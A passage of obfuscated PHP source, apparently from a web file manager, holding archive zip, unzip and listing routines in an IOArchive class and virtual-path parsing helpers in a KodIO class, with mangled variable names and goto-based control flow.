$BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[85]]; $fùí©‡ìŠ = array($EÆ¾¶ö„íœ[1017] => $EÆ¾¶ö„íœ[1026]); break; } $E¤Ò¿¯¯¶ = $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[85]]; if (!isset(self::$driverCache[$E¤Ò¿¯¯¶])) { $DÇÖÛîö²‰ = strtolower($fùí©‡ìŠ[$EÆ¾¶ö„íœ[100]]); $Bóá‰™ÊŠ  = $GLOBALS[$EÆ¾¶ö„íœ[6]][$EÆ¾¶ö„íœ[94]][$EÆ¾¶ö„íœ[1027]]; $E—…ƒæ½æ = $EÆ¾¶ö„íœ[81] . (isset($Bóá‰™ÊŠ [$DÇÖÛîö²‰]) ? $Bóá‰™ÊŠ [$DÇÖÛîö²‰] : ucfirst($DÇÖÛîö²‰)); if (!class_exists($E—…ƒæ½æ)) { show_json("{$E—…ƒæ½æ}\x20\x6e\157\x74\x20\x65\x78\151\x73\164\163\41", !1); } $fËÒë·“ŒÛ = isset($fùí©‡ìŠ[$EÆ¾¶ö„íœ[6]]) ? $fùí©‡ìŠ[$EÆ¾¶ö„íœ[6]] : !1; self::$driverCache[$E¤Ò¿¯¯¶] = new $E—…ƒæ½æ($fËÒë·“ŒÛ); } goto bİ·ÄÎ‚¥™; fÑğ•‡’ËŒ: $EÆ¾¶ö„íœ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d¥Ÿ¦Õƒ¸Ï = $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[1016]]; $Aõï¾ä±¢‹ = $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[375]]; goto e…ù¯”èÓ‘; E½Â­ì·á: $DÜ¾Ÿ‰Ä¾‹->path = $B…‚„‘µ½; return $DÜ¾Ÿ‰Ä¾‹; goto Bß–Îä¢œ; A¸°ÁÛ±Ø«: if (isset($fùí©‡ìŠ[$EÆ¾¶ö„íœ[6]][$EÆ¾¶ö„íœ[1028]])) { $DÜ¾Ÿ‰Ä¾‹->pathBase = rtrim($fùí©‡ìŠ[$EÆ¾¶ö„íœ[6]][$EÆ¾¶ö„íœ[1028]], $EÆ¾¶ö„íœ[8]) . $EÆ¾¶ö„íœ[8]; $B…‚„‘µ½ = $DÜ¾Ÿ‰Ä¾‹->pathBase . ltrim($B…‚„‘µ½, $EÆ¾¶ö„íœ[8]); } $B…‚„‘µ½ = $DÜ¾Ÿ‰Ä¾‹->getPath($B…‚„‘µ½); if (isset($BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[1002]])) { $B…‚„‘µ½ = $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[1002]]; } goto E½Â­ì·á; Bß–Îä¢œ: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $B¤„çàŒÏÒ; if (!$B¤„çàŒÏÒ) { $cÌó ë‰Ã‘ = IO::init($_SERVER[¶ªÕß‚ØÁŸ][8]); } return $cÌó ë‰Ã‘; } private static function iconvSystem($eŠÍÌº–Ëà) { return self::local()->iconvSystem($eŠÍÌº–Ëà); } private static function iconvApp($cÇ¾»«¹ë‰) { return self::local()->iconvApp($cÇ¾»«¹ë‰); } public static function zip($DˆÒ­Í›õ—, $F˜¾ÃŸÓ“² = "\172\x69\160", $F„Ïó‰ªĞ™ = '', $fóŸ½ã­ãâ = REPEAT_RENAME) { goto Dù¹Õ¾§íÊ; B¦ºëŒÀ”¦: if ($F„Ïó‰ªĞ™ || !$F¤©ô‘ÔõŒ) { if ($F¤©ô‘ÔõŒ && strstr($F¤©ô‘ÔõŒ, TEMP_FILES)) { $AÔ§…Òˆ£ç = $BÊìÛ…áœœ = array(); recursion_dir($eÏçˆ«¼¡, $AÔ§…Òˆ£ç, $BÊìÛ…áœœ, 0); foreach ($AÔ§…Òˆ£ç as $DÆå½åÓØ£) { del_dir($DÆå½åÓØ£); } foreach ($BÊìÛ…áœœ as $EÁ„‡”áÊ) { if ($EÁ„‡”áÊ == $d‹ãíƒŠ«Ç) { continue; } del_file($EÁ„‡”áÊ); } } return $b¯œª÷Ãö; } $eƒ†é‹¯ˆ = self::pathFather($F²ƒ¨ºÖñœ[$cğÀô¹³ˆ[85]]); $eÁÊŒ‡‚‘˜ = self::move($b¯œª÷Ãö, $eƒ†é‹¯ˆ, $fóŸ½ã­ãâ); goto F‘ï‘ÈêÊé; A‚®ö¾‚Ïó: foreach ($BÊìÛ…áœœ as $AâäíÌÛ°– => $B—õê÷‡î¥) { $BÊìÛ…áœœ[$AâäíÌÛ°–] = self::iconvSystem($B—õê÷‡î¥); } KodArchive::create($d‹ãíƒŠ«Ç, $BÊìÛ…áœœ); if (!IO::exist($b¯œª÷Ãö)) { if ($F¤©ô‘ÔõŒ) { del_dir($F¤©ô‘ÔõŒ); } show_json(LNG($cğÀô¹³ˆ[1031]), !1); } goto B¦ºëŒÀ”¦; Dù¹Õ¾§íÊ: $cğÀô¹³ˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E…ö¢ˆ‰—â = self::init($DˆÒ­Í›õ—[0][$cğÀô¹³ˆ[85]]); $F²ƒ¨ºÖñœ = self::info($DˆÒ­Í›õ—[0][$cğÀô¹³ˆ[85]]); goto B£ÖÕ­Ì½Œ; F¾¡šÈ­æ“: $b¯œª÷Ãö = $eÏçˆ«¼¡ . $c‹Ê¶»’Û . $cğÀô¹³ˆ[101] . $F˜¾ÃŸÓ“²; $b¯œª÷Ãö = get_filename_auto($b¯œª÷Ãö, $cğÀô¹³ˆ[33], $fóŸ½ã­ãâ); $d‹ãíƒŠ«Ç = self::iconvSystem($b¯œª÷Ãö); goto A‚®ö¾‚Ïó; F‘ï‘ÈêÊé: if (!$eÁÊŒ‡‚‘˜) { del_dir($F¤©ô‘ÔõŒ); show_json(LNG($cğÀô¹³ˆ[1031]), !1); } del_dir($F¤©ô‘ÔõŒ); return $eÁÊŒ‡‚‘˜; goto d³áŞ®²Æ; B£ÖÕ­Ì½Œ: $F¤©ô‘ÔõŒ = !1; if (!$F„Ïó‰ªĞ™ && $E…ö¢ˆ‰—â->getType() == $cğÀô¹³ˆ[112]) { $BÊìÛ…áœœ = self::zipFileList($DˆÒ­Í›õ—); } else { $F¤©ô‘ÔõŒ = $F„Ïó‰ªĞ™ ? $F„Ïó‰ªĞ™ : TEMP_FILES . $cğÀô¹³ˆ[1029] . time() . rand_string(8) . $cğÀô¹³ˆ[8]; mk_dir($F¤©ô‘ÔõŒ); $BÊìÛ…áœœ = self::zipFileList($DˆÒ­Í›õ—, $F¤©ô‘ÔõŒ); } $c‹Ê¶»’Û = $F²ƒ¨ºÖñœ[$cğÀô¹³ˆ[28]]; goto D¬ó¥ĞòÁŒ; D¬ó¥ĞòÁŒ: if (count($BÊìÛ…áœœ) > 1) { $C‡±¿ó†Í = IO::info(IO::pathFather($F²ƒ¨ºÖñœ[$cğÀô¹³ˆ[85]])); $c‹Ê¶»’Û = $C‡±¿ó†Í[$cğÀô¹³ˆ[28]]; } $eÏçˆ«¼¡ = $F¤©ô‘ÔõŒ; if (!$eÏçˆ«¼¡) { $eÏçˆ«¼¡ = get_path_father($F²ƒ¨ºÖñœ[$cğÀô¹³ˆ[85]]); $A¹‚ë§ÎšÊ = IO::info($eÏçˆ«¼¡); if (!$A¹‚ë§ÎšÊ[$cğÀô¹³ˆ[199]]) { show_json(LNG($cğÀô¹³ˆ[1030]), !1); } } goto F¾¡šÈ­æ“; d³áŞ®²Æ: } public static function unzip($A¹¸Õ®ŠÚğ, $còî‘¯ = "\162\x65\160\154\x61\x63\145") { goto bƒ¢ô—˜; aãøÕ³’½: if (!($fË¬ÇğñÍ = parent::info($C“„ãç÷ªğ))) { show_json(LNG($eŠ°”åÒØ‘[1033]), !1); } if (!($Fñ¼¿Õ‚ = parent::infoFull($A÷À‰ç«¡À))) { $A÷À‰ç«¡À = parent::mkdir($A÷À‰ç«¡À); $Fñ¼¿Õ‚ = array($eŠ°”åÒØ‘[85] => $A÷À‰ç«¡À); } else { if (isset($Fñ¼¿Õ‚[$eŠ°”åÒØ‘[377]]) && trim($Fñ¼¿Õ‚[$eŠ°”åÒØ‘[85]], $eŠ°”åÒØ‘[8]) != trim($A÷À‰ç«¡À, $eŠ°”åÒØ‘[8])) { $b‚¤ÀÜŞšÃ = KodIO::make($Fñ¼¿Õ‚[$eŠ°”åÒØ‘[469]]); $B·‡çµª‚¸ = parent::fileNameAuto($b‚¤ÀÜŞšÃ, $Fñ¼¿Õ‚[$eŠ°”åÒØ‘[28]], REPEAT_RENAME_FOLDER, !0); $A÷À‰ç«¡À = parent::mkdir($b‚¤ÀÜŞšÃ . $B·‡çµª‚¸); $Fñ¼¿Õ‚ = array($eŠ°”åÒØ‘[85] => $A÷À‰ç«¡À); } } $A÷À‰ç«¡À = $Fñ¼¿Õ‚[$eŠ°”åÒØ‘[85]]; goto AÄÊùé”½Ö; bƒ¢ô—˜: $eŠ°”åÒØ‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C“„ãç÷ªğ = $A¹¸Õ®ŠÚğ[$eŠ°”åÒØ‘[85]]; $A÷À‰ç«¡À = $A¹¸Õ®ŠÚğ[$eŠ°”åÒØ‘[1032]]; goto aãøÕ³’½; C½ÛÉ­ñç¶: foreach ($DÆŒî·ã¿Å as $B«èÔÅî¿Ó) { $B«èÔÅî¿Ó = self::iconvApp($B«èÔÅî¿Ó); self::move($B«èÔÅî¿Ó, $A÷À‰ç«¡À, $còî‘¯); } del_dir($bçˆ¸çğ«õ); if (!$A‘¿³åí¸) { del_file($E¾Ú„ù‡¸ğ); } goto eëÉ†Ì½½”; eù„÷´“›: if (!@file_exists(self::iconvSystem($E¾Ú„ù‡¸ğ))) { $A‘¿³åí¸ = self::localFilePath($C“„ãç÷ªğ, $FÛø½î‚¼); $E¾Ú„ù‡¸ğ = $A‘¿³åí¸ ? $A‘¿³åí¸ : parent::download($C“„ãç÷ªğ, $E¾Ú„ù‡¸ğ); } $E¾Ú„ù‡¸ğ = self::iconvSystem($E¾Ú„ù‡¸ğ); $B´¹Œ‰“•Ï = isset($A¹¸Õ®ŠÚğ[$eŠ°”åÒØ‘[1034]]) ? $A¹¸Õ®ŠÚğ[$eŠ°”åÒØ‘[1034]] : $eŠ°”åÒØ‘[1035]; goto DÊÛ¢Ÿ´–‹; DÊÛ¢Ÿ´–‹: $DÇ´à¾˜°“ = KodArchive::extract($E¾Ú„ù‡¸ğ, $bçˆ¸çğ«õ . $eŠ°”åÒØ‘[8], $B´¹Œ‰“•Ï); self::archiveExt(); if (!$DÇ´à¾˜°“[$eŠ°”åÒØ‘[1036]]) { show_json($eŠ°”åÒØ‘[1037] . $DÇ´à¾˜°“[$eŠ°”åÒØ‘[1038]], !1); } goto f›öôëŸ·Î; AÄÊùé”½Ö: $dÁùÛñâ¼â = self::tmpFileName($fË¬ÇğñÍ); $bçˆ¸çğ«õ = TEMP_FILES . $dÁùÛñâ¼â; del_dir($bçˆ¸çğ«õ); goto d×à­¬Â¼Î; eëÉ†Ì½½”: return !0; goto b¢‚œœï‡æ; d×à­¬Â¼Î: mk_dir($bçˆ¸çğ«õ); $FÛø½î‚¼ = self::fileExt($fË¬ÇğñÍ); $E¾Ú„ù‡¸ğ = $bçˆ¸çğ«õ . $eŠ°”åÒØ‘[101] . $FÛø½î‚¼; goto eù„÷´“›; f›öôëŸ·Î: Hook::trigger($eŠ°”åÒØ‘[1039], $bçˆ¸çğ«õ); recursion_dir($bçˆ¸çğ«õ, $bÅ©¸ôè², $eŒ²±¦ÃŸË, 0); $DÆŒî·ã¿Å = array_merge($bÅ©¸ôè², $eŒ²±¦ÃŸË); goto C½ÛÉ­ñç¶; b¢‚œœï‡æ: } public static function unzipList($bÏ¢¬¶“‚) { goto EÛØ­ÌÀ•; f‰ò¢ˆš¾®: self::archiveExt(); del_dir($a±ß§¤¨»‘); if (!$DöÒÉ¶¸æÍ[$DÉ¹ƒ½±‰º[1036]]) { show_json($DöÒÉ¶¸æÍ[$DÉ¹ƒ½±‰º[1038]], !1); } goto Eœ—ğ…Ó; EŒßØ¦µÚ: return $DöÒÉ¶¸æÍ[$DÉ¹ƒ½±‰º[1038]]; goto Fò‚×Úâ­; a‘ÔÏóàİÉ: $cÏÎŒÁÃã¯ = self::info($C¥›êˆ³¯¸); $aÃ§±ì¡Ë = self::fileExt($cÏÎŒÁÃã¯); $f‡åÚØ¡ç™ = self::tmpFileName($cÏÎŒÁÃã¯); goto AÂé¼ƒéÊ; Eœ—ğ…Ó: $a†÷›¹•’¢ = json_encode($DöÒÉ¶¸æÍ[$DÉ¹ƒ½±‰º[1038]]); self::setContent($e­³ ¸Ä®‡, $a†÷›¹•’¢); if (count($DöÒÉ¶¸æÍ[$DÉ¹ƒ½±‰º[1038]]) >= $Eã–„æÑƒ) { show_json(sprintf(LNG($DÉ¹ƒ½±‰º[1042]), count($DöÒÉ¶¸æÍ[$DÉ¹ƒ½±‰º[1038]])), !1); } goto EŒßØ¦µÚ; F¦ÈØóğ: $fÁÄæ˜ìË = self::iconvSystem($fÁÄæ˜ìË); if ($AÇÛåª±àŒ >= 0) { $Bë¸¿’©ò‰ = isset($bÏ¢¬¶“‚[$DÉ¹ƒ½±‰º[1044]]) ? $bÏ¢¬¶“‚[$DÉ¹ƒ½±‰º[1044]] : !1; $B¾š…Ø»ğ = isset($bÏ¢¬¶“‚[$DÉ¹ƒ½±‰º[28]]) ? $bÏ¢¬¶“‚[$DÉ¹ƒ½±‰º[28]] : $DÉ¹ƒ½±‰º[33]; KodArchive::filePreview($fÁÄæ˜ìË, $AÇÛåª±àŒ, $Bë¸¿’©ò‰, $B¾š…Ø»ğ); self::archiveExt(); die; } $DöÒÉ¶¸æÍ = KodArchive::listContent($fÁÄæ˜ìË); goto f‰ò¢ˆš¾®; eÚá¼î›œÕ: $Eã–„æÑƒ = 50000; if (request_url_safe($fóÓ‡æ‡ïÅ)) { $BîÇŒÁ…ò = parse_url_query($fóÓ‡æ‡ïÅ); if (!isset($BîÇŒÁ…ò[$DÉ¹ƒ½±‰º[85]])) { show_json($DÉ¹ƒ½±‰º[1041], !1); } } $C¥›êˆ³¯¸ = isset($BîÇŒÁ…ò) ? $BîÇŒÁ…ò[$DÉ¹ƒ½±‰º[85]] : $fóÓ‡æ‡ïÅ; goto a‘ÔÏóàİÉ; EÛØ­ÌÀ•: $DÉ¹ƒ½±‰º =& $_SERVER[¶ªÕß‚ØÁŸ]; $fóÓ‡æ‡ïÅ = $bÏ¢¬¶“‚[$DÉ¹ƒ½±‰º[85]]; $AÇÛåª±àŒ = isset($bÏ¢¬¶“‚[$DÉ¹ƒ½±‰º[1040]]) ? $bÏ¢¬¶“‚[$DÉ¹ƒ½±‰º[1040]] : -1; goto eÚá¼î›œÕ; CÓ±ÕÏåöµ: if (!is_dir($a±ß§¤¨»‘)) { mk_dir($a±ß§¤¨»‘); } $fÁÄæ˜ìË = $a±ß§¤¨»‘ . $DÉ¹ƒ½±‰º[8] . $FŠ‘´Óáò; if (!@file_exists(self::iconvSystem($fÁÄæ˜ìË))) { if (isset($BîÇŒÁ…ò)) { url_request($fóÓ‡æ‡ïÅ, $DÉ¹ƒ½±‰º[1043], $fÁÄæ˜ìË); } else { $D¾²êÌÈò = self::localFilePath($fóÓ‡æ‡ïÅ, $aÃ§±ì¡Ë); $fÁÄæ˜ìË = $D¾²êÌÈò ? $D¾²êÌÈò : self::download($fóÓ‡æ‡ïÅ, $fÁÄæ˜ìË); } } goto F¦ÈØóğ; AÂé¼ƒéÊ: if (isset($BîÇŒÁ…ò)) { $C­¼ÔŒ´„™ = array($BîÇŒÁ…ò[$DÉ¹ƒ½±‰º[85]], $BîÇŒÁ…ò[$DÉ¹ƒ½±‰º[1040]], $BîÇŒÁ…ò[$DÉ¹ƒ½±‰º[28]]); $FŠ‘´Óáò = md5(implode($DÉ¹ƒ½±‰º[80], $C­¼ÔŒ´„™)) . $DÉ¹ƒ½±‰º[101] . get_path_ext($BîÇŒÁ…ò[$DÉ¹ƒ½±‰º[28]]); } else { $C­¼ÔŒ´„™ = array($cÏÎŒÁÃã¯[$DÉ¹ƒ½±‰º[28]], $cÏÎŒÁÃã¯[$DÉ¹ƒ½±‰º[85]], $cÏÎŒÁÃã¯[$DÉ¹ƒ½±‰º[87]]); $FŠ‘´Óáò = md5(implode($DÉ¹ƒ½±‰º[80], $C­¼ÔŒ´„™)) . $DÉ¹ƒ½±‰º[101] . $aÃ§±ì¡Ë; } if ($AÇÛåª±àŒ == -1) { $e­³ ¸Ä®‡ = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\x56\x69\x65\167\57{$f‡åÚØ¡ç™}\57{$FŠ‘´Óáò}\x2e\154\x6f\x67"; $F»êÆ¦§´Ì = self::infoFull($e­³ ¸Ä®‡); if ($F»êÆ¦§´Ì) { $e­³ ¸Ä®‡ = $F»êÆ¦§´Ì[$DÉ¹ƒ½±‰º[85]]; $e¢åÃ§ Æƒ = self::getContent($e­³ ¸Ä®‡); if ($e¢åÃ§ Æƒ) { $a†÷›¹•’¢ = json_decode($e¢åÃ§ Æƒ, !0); if (count($a†÷›¹•’¢) >= $Eã–„æÑƒ) { show_json(sprintf(LNG($DÉ¹ƒ½±‰º[1042]), count($a†÷›¹•’¢)), !1); } return $a†÷›¹•’¢; } } else { $e­³ ¸Ä®‡ = self::mkfile($e­³ ¸Ä®‡); } } $a±ß§¤¨»‘ = TEMP_FILES . $f‡åÚØ¡ç™; goto CÓ±ÕÏåöµ; Fò‚×Úâ­: } private static function fileExt($FææìÜ£) { $FÁ†á¼Ÿ„Ú =& $_SERVER[¶ªÕß‚ØÁŸ]; $E‰‘–À²Ì… = $FææìÜ£[$FÁ†á¼Ÿ„Ú[170]]; if ($E‰‘–À²Ì… == $FÁ†á¼Ÿ„Ú[1045]) { $cß„éƒìè° = $FÁ†á¼Ÿ„Ú[1046]; if (substr($FææìÜ£[$FÁ†á¼Ÿ„Ú[28]], -strlen($cß„éƒìè°)) == $cß„éƒìè°) { $E‰‘–À²Ì… = $FÁ†á¼Ÿ„Ú[1047]; } } self::archiveExt($E‰‘–À²Ì…); return $E‰‘–À²Ì…; } private static function zipFileList($BÔ¸ã‰ô¯ä, $cÍŒÓÍ¿‚ = false) { $f¿øÀØÁ =& $_SERVER[¶ªÕß‚ØÁŸ]; $AÓ‰Ëù¾“Â = array(); foreach ($BÔ¸ã‰ô¯ä as $BŸß§øç¥) { $c§ÏõĞ¿Û¢ = $BŸß§øç¥[$f¿øÀØÁ[85]]; if ($cÍŒÓÍ¿‚) { $c§ÏõĞ¿Û¢ = self::copy($BŸß§øç¥[$f¿øÀØÁ[85]], $cÍŒÓÍ¿‚, $f¿øÀØÁ[758]); } if ($c§ÏõĞ¿Û¢ && self::local()->exist($c§ÏõĞ¿Û¢)) { $AÓ‰Ëù¾“Â[$BŸß§øç¥[$f¿øÀØÁ[85]]] = $c§ÏõĞ¿Û¢; } } if (!empty($AÓ‰Ëù¾“Â)) { return array_values($AÓ‰Ëù¾“Â); } show_json(LNG($f¿øÀØÁ[1048]), !1); } public static function tmpFileName($eÙ‘À¡Å ) { $bŒÛåªòå =& $_SERVER[¶ªÕß‚ØÁŸ]; $b¥Œõµ = array($eÙ‘À¡Å [$bŒÛåªòå[28]], $eÙ‘À¡Å [$bŒÛåªòå[85]], $eÙ‘À¡Å [$bŒÛåªòå[87]], $eÙ‘À¡Å [$bŒÛåªòå[467]]); return md5(implode($bŒÛåªòå[80], $b¥Œõµ)); } private static function localFilePath($Fö·¡·æ‹ì, $dæŒ°œâåİ) { goto cĞìöÈµá¨; BÉªÂ´ŞÚ¿: if ($b­‘ÚçâÜ„ == $aÊ‡ßáù°Š[112] || $b­‘ÚçâÜ„ == $aÊ‡ßáù°Š[1052]) { if (!$A¥Õ²ÆŸô->exist($A¥Õ²ÆŸô->path)) { show_json(LNG($aÊ‡ßáù°Š[111]), !1); } return $A¥Õ²ÆŸô->path; } return !1; goto eÒâÍ¼…ÅÈ; CÜ¡‚ˆ“öœ: if ($C£ÃñÖ†‡[$aÊ‡ßáù°Š[29]] == KodIO::KOD_SOURCE) { $C¨ñš„Ê¿ = Model($aÊ‡ßáù°Š[766])->fileInfoGet(KodIO::sourceID($Fö·¡·æ‹ì)); if (!$C¨ñš„Ê¿[$aÊ‡ßáù°Š[85]]) { show_json($aÊ‡ßáù°Š[1051], !1); } $Fö·¡·æ‹ì = $C¨ñš„Ê¿[$aÊ‡ßáù°Š[85]]; } $A¥Õ²ÆŸô = self::init($Fö·¡·æ‹ì); $b­‘ÚçâÜ„ = $A¥Õ²ÆŸô->getType(); goto BÉªÂ´ŞÚ¿; cĞìöÈµá¨: $aÊ‡ßáù°Š =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($dæŒ°œâåİ == $aÊ‡ßáù°Š[1049] && strtoupper(substr(PHP_OS, 0, 3)) == $aÊ‡ßáù°Š[1050]) { return !1; } $C£ÃñÖ†‡ = KodIO::parse($Fö·¡·æ‹ì); goto CÜ¡‚ˆ“öœ; eÒâÍ¼…ÅÈ: } private static function archiveExt($d—çÖ†’ê¿ = '') { $GLOBALS[$_SERVER[¶ªÕß‚ØÁŸ][1053]] = $d—çÖ†’ê¿; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\163\145\x72\122\145\143\171\143\x6c\x65\175"; const KOD_USER_FAV = "\173\165\x73\145\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\x72\106\151\154\x65\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\x69\154\x65\124\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\x75\x70\x52\x6f\157\x74\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\x72\123\x68\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\162\x53\x68\141\x72\145\114\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\x72\145\x54\157\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\x73\150\x61\x72\145\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\x72\145\111\x74\145\x6d\114\151\156\x6b\175"; const KOD_SEARCH = "\x7b\x73\145\x61\162\143\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\x63\153\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\x72\x52\x65\156\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\145\162\x7d"; public static function typeList() { $AñœÕğ„² =& $_SERVER[¶ªÕß‚ØÁŸ]; return array($AñœÕğ„²[1054] => self::KOD_SOURCE, $AñœÕğ„²[1055] => self::KOD_USER_RECYCLE, $AñœÕğ„²[1056] => self::KOD_USER_FAV, $AñœÕğ„²[1057] => self::KOD_USER_FILE_TAG, $AñœÕğ„²[1058] => self::KOD_USER_FILE_TYPE, $AñœÕğ„²[1059] => self::KOD_GROUP_ROOT_SELF, $AñœÕğ„²[1060] => self::KOD_USER_SHARE, $AñœÕğ„²[1061] => self::KOD_USER_SHARE_LINK, $AñœÕğ„²[1062] => self::KOD_USER_SHARE_TO_ME, $AñœÕğ„²[1063] => self::KOD_SHARE_ITEM, $AñœÕğ„²[1064] => self::KOD_SHARE_LINK, $AñœÕğ„²[1065] => self::KOD_SEARCH, $AñœÕğ„²[1066] => self::KOD_BLOCK, $AñœÕğ„²[1067] => self::KOD_IO, $AñœÕğ„²[1068] => self::KOD_USER_RECENT, $AñœÕğ„²[1069] => self::KOD_USER_DRIVER); } public static function parse($E¢­¸›ƒÄì) { goto FÔ‘ï–¡¶ì; CÑ£¨Ô”º: preg_match($CĞÙÒéŠ˜¹[1070], $E¢­¸›ƒÄì, $EØŸğòøš); $fÅÁ­Ó÷Ğ¥ = array($CĞÙÒéŠ˜¹[396] => !1, $CĞÙÒéŠ˜¹[1071] => !1, $CĞÙÒéŠ˜¹[393] => !1, $CĞÙÒéŠ˜¹[85] => $E¢­¸›ƒÄì, $CĞÙÒéŠ˜¹[1016] => !1, $CĞÙÒéŠ˜¹[1015] => $CĞÙÒéŠ˜¹[33]); if (is_array($EØŸğòøš) && count($EØŸğòøš) == 5) { $cÁƒ‡à¡Ï• = $CĞÙÒéŠ˜¹[1072] . $EØŸğòøš[2] . $CĞÙÒéŠ˜¹[324]; if (in_array($cÁƒ‡à¡Ï•, $fé¤âºáÈº)) { $fÅÁ­Ó÷Ğ¥[$CĞÙÒéŠ˜¹[1016]] = $EØŸğòøš[1]; $fÅÁ­Ó÷Ğ¥[$CĞÙÒéŠ˜¹[29]] = $cÁƒ‡à¡Ï•; $fÅÁ­Ó÷Ğ¥[$CĞÙÒéŠ˜¹[1073]] = substr($cÁƒ‡à¡Ï•, 1, -1); $fÅÁ­Ó÷Ğ¥[$CĞÙÒéŠ˜¹[375]] = $EØŸğòøš[3]; } $fÅÁ­Ó÷Ğ¥[$CĞÙÒéŠ˜¹[1015]] = $EØŸğòøš[4]; } goto CÀÍÁ½¬‘…; CÀÍÁ½¬‘…: $cÀ×‡¾ÇíÇ = array($CĞÙÒéŠ˜¹[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $fÅÁ­Ó÷Ğ¥[$CĞÙÒéŠ˜¹[1074]] = in_array($fÅÁ­Ó÷Ğ¥[$CĞÙÒéŠ˜¹[29]], $cÀ×‡¾ÇíÇ); return $fÅÁ­Ó÷Ğ¥; goto c¤å«ÒÑõë; FÔ‘ï–¡¶ì: $CĞÙÒéŠ˜¹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E¢­¸›ƒÄì = self::clear($E¢­¸›ƒÄì); $fé¤âºáÈº = array_values(self::typeList()); goto CÑ£¨Ô”º; c¤å«ÒÑõë: } public static function clear($dö’°ÅÏØ) { goto C“¢ŒòĞ…º; EğƒŠ„…Ù: $dö’°ÅÏØ = preg_replace($B† ÌÛöÕà[1077], $B† ÌÛöÕà[8], $dö’°ÅÏØ); if ($dö’°ÅÏØ == $B† ÌÛöÕà[8]) { return $B† ÌÛöÕà[8]; } $dö’°ÅÏØ = rtrim($dö’°ÅÏØ, $B† ÌÛöÕà[8]); goto Dç‚¨•æ; C“¢ŒòĞ…º: $B† ÌÛöÕà =& $_SERVER[¶ªÕß‚ØÁŸ]; $dö’°ÅÏØ = str_replace(array($B† ÌÛöÕà[996], $B† ÌÛöÕà[62]), $B† ÌÛöÕà[50], $dö’°ÅÏØ); $dö’°ÅÏØ = str_replace($B† ÌÛöÕà[103], $B† ÌÛöÕà[8], $dö’°ÅÏØ); goto eôš­ä‡œ¼; eôš­ä‡œ¼: $EñÒèãİÙ = $B† ÌÛöÕà[1075]; if (substr($dö’°ÅÏØ, 0, 3) == $B† ÌÛöÕà[1076]) { $dö’°ÅÏØ = substr($dö’°ÅÏØ, 3); } while (strstr($dö’°ÅÏØ, $EñÒèãİÙ)) { $dö’°ÅÏØ = str_replace($EñÒèãİÙ, $B† ÌÛöÕà[8], $dö’°ÅÏØ); } goto EğƒŠ„…Ù; Dç‚¨•æ: return $dö’°ÅÏØ; goto f°…„ê¾Çø; f°…„ê¾Çø: } public static function sourceID($bŞ¾º˜‘ƒÄ) { $bäÁ¸Şá°¼ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e‚‘è¿—Ú = self::parse($bŞ¾º˜‘ƒÄ); if ($e‚‘è¿—Ú[$bäÁ¸Şá°¼[29]] !== self::KOD_SOURCE) { show_json(LNG($bäÁ¸Şá°¼[1078]), !1); } return $e‚‘è¿—Ú[$bäÁ¸Şá°¼[375]]; } public static function make($FŒÆ´ÌÍÉ) { if (!$FŒÆ´ÌÍÉ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($FŒÆ´ÌÍÉ)); } public static function makeShare($aäóÈ¶Ï”ì, $bÎªçŠèÔ¸) { return self::makePath(self::KOD_SHARE_ITEM, $aäóÈ¶Ï”ì, $bÎªçŠèÔ¸); } public static function makeFileTypePath($eä‹¬Æ‹¼) { return self::makePath(self::KOD_USER_FILE_TYPE, $eä‹¬Æ‹¼); } public static function makeFileTagPath($EƒÚÌÉ•·) { return self::makePath(self::KOD_USER_FILE_TAG, $EƒÚÌÉ•·); } public static function makePath($Fï‰¤İ¯„ , $DŠíˆšãõâ = '', $EĞñ‰Ÿò“ó = '') { $eÖ—¬ù§‘Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÊ³÷¡”Âµ = substr($Fï‰¤İ¯„ , 1, -1); $bî‰ÈòÒ‚­ = $eÖ—¬ù§‘Œ[1079] . $FÊ³÷¡”Âµ . $eÖ—¬ù§‘Œ[1080] . $DŠíˆšãõâ . $eÖ—¬ù§‘Œ[1081]; $bî‰ÈòÒ‚­ = $EĞñ‰Ÿò“ó ? $bî‰ÈòÒ‚­ . $EĞñ‰Ÿò“ó . $eÖ—¬ù§‘Œ[8] : $bî‰ÈòÒ‚­; return $bî‰ÈòÒ‚­; } public static function hashPath($AÂ·˜Âè¹ò) { $dåØ˜³âï =& $_SERVER[¶ªÕß‚ØÁŸ]; $cŸ½²Î‚“” = is_array($AÂ·˜Âè¹ò) ? $AÂ·˜Âè¹ò : IO::info($AÂ·˜Âè¹ò); $D¾ò†ßÕ = _get($cŸ½²Î‚“”, $dåØ˜³âï[1082], $dåØ˜³âï[33]); if (!$D¾ò†ßÕ) { $b¹È„ãàô´ = 